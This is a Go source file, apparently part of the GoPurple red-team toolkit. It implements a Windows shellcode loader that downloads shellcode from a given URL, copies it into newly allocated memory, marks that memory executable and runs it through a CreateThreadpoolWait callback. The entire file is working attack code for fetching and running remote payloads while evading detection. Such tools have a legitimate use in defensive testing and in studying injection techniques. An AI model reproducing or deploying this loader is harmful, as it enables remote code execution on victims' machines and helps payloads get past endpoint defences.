//by @s3cdev
//Reference : https://www.ired.team/offensive-security/code-injection-process-injection/shellcode-execution-via-createthreadpoolwait

package techniques
import (
	"github.com/sh4hin/GoPurple/helpers"
	"fmt"
	"golang.org/x/sys/windows"
	"log"
	"unsafe"
)


func RunCreateThreadpoolWait(url string) {
	shellcode := helpers.FetchUrl(url)


	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	ntdll := windows.NewLazySystemDLL("ntdll.dll")


	VirtualAlloc := kernel32.NewProc("VirtualAlloc")
	VirtualProtect := kernel32.NewProc("VirtualProtect")
	RtlCopyMemory := ntdll.NewProc("RtlCopyMemory")

	CreateThreadPoolWait := kernel32.NewProc("CreateThreadpoolWait")
	SetThreadPoolWait := kernel32.NewProc("SetThreadpoolWait")

	WaitForSingleObject := kernel32.NewProc("WaitForSingleObject")


	event, err := windows.CreateEvent(nil, 0, 1, nil)
	if err != nil {
		return
	}
	addr, _, errVirtualAlloc := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
	if errVirtualAlloc != nil && errVirtualAlloc.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("[!]Error calling VirtualAlloc:\r\n%s", errVirtualAlloc.Error()))
	}
	_, _, errRtlCopyMemory := RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
	if errRtlCopyMemory != nil && errRtlCopyMemory.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("[!]Error calling RtlCopyMemory:\r\n%s", errRtlCopyMemory.Error()))
	}
	oldProtect := PAGE_READWRITE
	_, _, errVirtualProtect := VirtualProtect.Call(addr, uintptr(len(shellcode)), PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
	if errVirtualProtect != nil && errVirtualProtect.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("Error calling VirtualProtect:\r\n%s", errVirtualProtect.Error()))
	}

	pool, _, errpool := CreateThreadPoolWait.Call(addr, 0, 0)
	if errpool != nil &&  errpool.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("[!]Error calling VirtualAlloc:\r\n%s", errpool.Error()))
	}
	_, _, errpoolwait := SetThreadPoolWait.Call(pool, uintptr(event), 0)
	if errpoolwait != nil &&  errpoolwait.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("[!]Error calling VirtualAlloc:\r\n%s", errpoolwait.Error()))
	}

	_, _, errWaitForSingleObject := WaitForSingleObject.Call(uintptr(event), 0xFFFFFFFF)
	if errWaitForSingleObject != nil && errWaitForSingleObject.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("[!]Error calling WaitForSingleObject:\r\n:%s", errWaitForSingleObject.Error()))
	}

}